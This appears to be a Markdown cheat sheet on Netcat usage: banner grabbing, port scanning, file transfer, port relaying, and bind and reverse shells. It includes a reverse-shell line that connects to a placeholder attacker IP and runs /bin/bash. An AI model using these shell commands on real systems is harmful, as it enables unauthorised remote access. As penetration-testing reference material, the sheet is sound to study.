# Netcat (nc)

## Overview
Often called the "Swiss Army Knife" of networking, Netcat reads and writes data across network connections using TCP or UDP.

## Banner Grabbing
Connect to a port to view the service banner.
```bash
nc -nv 192.168.1.10 22
```

## Port Scanning
While Nmap is better, Netcat can scan ports:
```bash
nc -zv 192.168.1.10 20-80
```

## File Transfer
**Receiver:**
```bash
nc -lvp 4444 > received_file.txt
```
**Sender:**
```bash
nc 192.168.1.10 4444 < file_to_send.txt
```

## Chat/Messaging
**Server:** `nc -lvp 4444`
**Client:** `nc 192.168.1.10 4444`
*(Whatever is typed on one side appears on the other).*

## Bind Shells and Reverse Shells
**Bind Shell (Listener offers shell):**
Target (Linux): `nc -lvp 4444 -e /bin/bash`
Attacker: `nc [Target_IP] 4444`

**Reverse Shell (Target connects back to listener):**
Attacker: `nc -lvp 4444`
Target (Linux): `nc [Attacker_IP] 4444 -e /bin/bash`

*(If `-e` is not supported, use the bash reverse shell one-liner).*

## Port Forwarding / Relaying
Using named pipes to relay traffic:
```bash
mknod backpipe p
nc -lvp 8080 0<backpipe | nc 10.0.0.5 80 1>backpipe
```

## Differences: nc, ncat, netcat, socat
- `nc` / `netcat`: Standard versions. OpenBSD version lacks `-e` for security.
- `ncat`: Nmap's modern replacement for Netcat, supports SSL and IPv6.
- `socat`: A more advanced, complex version of Netcat supporting multiple protocols and bidirectional data transfers.

## Security Implications
Leaving a Netcat listener open with `-e` is extremely dangerous. Attackers constantly scan for open Netcat shells.
